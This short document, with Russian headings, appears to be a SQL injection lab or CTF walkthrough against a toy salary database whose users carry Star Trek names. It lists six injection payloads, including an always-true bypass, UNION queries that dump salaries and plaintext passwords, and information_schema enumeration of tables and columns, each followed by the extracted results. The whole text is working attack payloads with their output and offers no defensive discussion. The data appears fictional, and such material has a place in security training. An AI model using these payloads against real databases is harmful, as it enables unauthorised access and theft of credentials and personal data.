1.
' OR 1=1 --

**Извлечена вся информация о зарплатах пользователей**

| Username | Salary |
|----------|--------|
| james_kirk | 25000 |
| mr_spock | 99000 |
| leonard_mccoy | 45000 |
| nyota_uhura | 39000 |
| montgomery_scott | 1250 |
| hiraku_sulu | 3500 |
| pavel_chekov | 2500 |

2.
' UNION SELECT @@version, null--

**Информация о версии базы данных**

| Username | Salary |
|----------|--------|
| 8.3.0 | null |

3. 
' UNION SELECT username, password FROM users--

**Восстановленные хэшированные/зашифрованные пароли**

| Username | Password |
|----------|----------|
| james_kirk | kobayashi_maru |
| mr_spock | 0nlyL0g!c |
| leonard_mccoy | hesDEADjim! |
| nyota_uhura | StarShine |
| montgomery_scott | ScottyDoesntKnow |
| hiraku_sulu | parking-break-on |
| pavel_chekov | 99victorvictor2 |

4.
' UNION SELECT current_user(), null--

Текущий пользователь базы данных

| Username | Salary |
|----------|--------|
| john_harrison@% | null |

5. 
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = database()--

**Список таблиц базы данных**

| Username | Salary |
|----------|--------|
| users | null |

6. 
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database()--

 **Информация о структуре таблицы**

| Column Name | Data Type |
|-------------|-----------|
| first_name | varchar |
| last_name | varchar |
| password | varchar |
| salary | int |
| username | varchar |
